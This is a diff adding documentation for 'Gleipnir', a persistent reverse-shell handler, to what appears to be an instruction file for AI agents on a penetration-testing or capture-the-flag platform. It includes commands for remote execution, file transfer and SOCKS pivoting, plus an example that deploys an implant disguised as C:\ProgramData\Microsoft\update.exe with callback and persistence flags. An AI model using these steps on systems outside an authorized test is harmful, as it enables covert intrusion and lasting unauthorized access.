@@ -186,6 +186,39 @@ When running unattended, periodically poll the inbox, act on instructions that a
 and reply with status. If an instruction is out of scope or ambiguous, reply asking for
 clarification rather than guessing. The human sees your replies in the frontend immediately.
 
+## Gleipnir (reverse shell sessions)
+
+Gleipnir is PK's persistent reverse shell handler. The relay runs as a Docker service
+sharing the attackbox network. Agents are deployed to targets and connect back over
+TCP/TLS. Sessions survive target reboots via auto-reconnect.
+
+```bash
+# Session management
+pk shell list                          # list active sessions
+pk shell exec <session> <command>      # run command on target
+pk shell attach <session>              # interactive REPL
+pk shell info <session>                # session details (OS, arch, user, PID)
+
+# File transfer
+pk upload <session> <src> <dst>        # upload file to target
+pk download <session> <src> <dst>      # download file from target
+
+# SOCKS pivoting
+pk tunnel up <session> --socks <port>  # start SOCKS5 proxy through target
+pk tunnel status                       # list active tunnels
+pk tunnel down <session>               # stop tunnel
+
+# Agent binaries (pre-compiled, ready for deployment)
+pk agent list                          # list available agent binaries
+pk agent path <target>                 # path to binary (e.g. linux-amd64-tls)
+```
+
+Deploy an agent to a target:
+```bash
+pk upload mysession $(pk agent path windows-amd64-tls) C:\ProgramData\Microsoft\update.exe
+pk shell exec mysession "C:\ProgramData\Microsoft\update.exe -H <lhost> -p 4444 --tls --cron"
+```
+
 ## Command discipline
 
 - **Surgical over exhaustive.** Prefer targeted, minimal-footprint approaches. Do not run
@@ -197,7 +230,11 @@ clarification rather than guessing. The human sees your replies in the frontend 
 - **Intentional piping only.** Piping to filter large output is good (`grep open` on nmap
   results). Piping unrelated commands together is bad (`cat flag.txt | ls`). Each step in a
   pipe should serve the same objective.
-- **Use `pk exec`** for all tool commands (auto-logs to activity). Do not use raw `docker exec`.
+- **Attackbox tools** (nmap, ffuf, sqlmap, etc.): `pk exec -- <command>`. Auto-logs to
+  activity. Do not use raw `docker exec`.
+- **Target interaction** via gleipnir sessions: `pk shell exec <session> <command>` for
+  commands on the target, `pk upload`/`pk download` for file transfer, `pk tunnel` for
+  SOCKS pivoting. These also auto-log to activity.
 - **Use `pk think`** to log reasoning (shows in Agent Log tab on the frontend).
 - **Log flags properly:** save to file, `pk evidence add --type flag`, `pk finding add`,
   then post a short status to inbox. Do not just print flags to the chat.
